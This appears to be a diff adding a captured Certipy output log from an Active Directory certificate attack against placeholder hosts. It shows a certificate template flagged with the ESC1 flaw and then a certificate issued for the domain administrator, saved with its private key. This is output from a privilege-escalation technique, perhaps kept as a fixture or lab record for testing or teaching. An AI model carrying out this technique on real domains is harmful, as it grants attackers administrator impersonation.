@@ -1,0 +1,13 @@
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+[*] Finding certificate templates
+Certificate Authorities
+  0
+    CA Name                             : CORP-CA01
+    DNS Name                            : ca01.corp.example
+Certificate Templates
+  0
+    Template Name                       : UserAuth
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject
+[*] Got certificate with UPN 'administrator@corp.example'
+[*] Saved certificate and private key to 'admin_cert.pfx'
